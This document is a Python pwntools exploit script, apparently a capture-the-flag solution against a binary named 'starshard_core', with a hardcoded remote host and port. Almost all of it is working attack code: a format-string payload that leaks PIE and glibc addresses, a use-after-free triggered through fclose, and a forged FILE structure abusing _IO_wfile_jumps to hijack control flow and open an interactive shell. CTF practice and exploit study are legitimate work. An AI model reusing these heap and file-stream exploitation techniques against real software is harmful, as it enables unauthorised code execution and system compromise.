#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './starshard_core', checksec=False)
libc = ELF("glibc/libc.so.6", checksec=False)


"""
char[16]    tinkerer_name   
char[24]    spell_name  
FILE *      core_log    
char *      spell_fragment  
size_t      fragment_sz 
"""

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("154.57.164.62", 30459)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

spell_sz = 0x18
name_sz = 0x10
pie_off = 10 
libc_off = 9 

io = start()

sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
s = lambda a: io.send(a)
rlu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
itb = lambda a: str(a).encode()

def logleak(name: str, addr: int): print(f"[*] %s => %#lx" % (name, addr))

def arm(name: bytes):
    sla(b'> ', itb(1))
    s(name)

def attach(size: int, msg: bytes):
    #assert len(msg) <= size
    sla(b'> ', itb(2))
    sla(b'Size: ', itb(size))
    s(msg)

def cancel(): sla(b'> ', itb(3))
def commit(): sla(b'> ', itb(4))

payload = f'%{pie_off}$p||%{libc_off}$p'.encode()
sla(b'Name: ', payload)
rlu(b'Welcome')

leaks = rl().split(b'\xe2\x80\x94')[0].strip().split(b'||')

exe.address = int(leaks[0], 16) - 0x40
libc.address = int(leaks[1], 16) - 0x2dfd0

logleak("piebase", exe.address)
logleak("glibc base", libc.address)

name = b'A' * spell_sz
arm(name)
rlu(name)
fake_fp_ptr = u64(rl().strip().ljust(8, b'\x00'))
heap = fake_fp_ptr - 0x2a0

logleak("uaf ptr", fake_fp_ptr)
logleak("heap base", heap)

print("[+] Trigger uaf by fclose")

cancel()

fake_fp = flat(0) # flags == 0
fake_fp += flat(heap + 0x323) * 7 + flat(heap + 0x324)
fake_fp += flat(0x0) * 4 + flat(libc.sym.stderr) 
fake_fp += flat(0x3) + flat(0x0) * 2
fake_fp += flat(heap + 0x380) + flat(0xffffffffffffffff)
fake_fp += flat(0x0) + flat(heap+0x390)
fake_fp += flat(0x0) * 6  + flat(libc.sym['_IO_wfile_jumps'] + 0x8)
fake_fp += flat(0x0) + flat(0x0) # aqui el falso doallocate
#empieza el _Widedata
fake_fp += flat(0x0) * 3 # los _IO_read
fake_fp += flat(0x0) * 3 # los _IO_write
fake_fp += flat(0x0) * 3 # los _IO_buf y relleno hasta vltable
fake_fp += flat(0xdeadbeef) * 17
fake_fp += flat(exe.sym.ginger_gate) + flat(0xdeadbeef)
fake_fp += flat(heap + 0x460 - 0x68)[:7]


attach(0x1e0 - 8, fake_fp)

cancel()
cancel()

io.clean()
print(f"[*] Shell!")

io.interactive()
